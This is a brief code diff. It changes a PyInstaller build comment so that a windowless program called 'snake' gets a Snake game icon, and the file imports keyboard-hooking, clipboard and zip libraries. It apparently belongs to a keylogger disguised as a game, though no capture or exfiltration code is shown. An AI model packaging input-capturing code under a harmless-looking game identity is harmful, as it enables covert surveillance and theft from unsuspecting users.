@@ -1,4 +1,4 @@
-# pyinstaller -F -w -n snake system.py
+# pyinstaller -F -w -n snake -i Snake.ico system.py
 
 import pyHook, pythoncom, sys, win32api, win32con, os, time
 import win32clipboard, zipfile
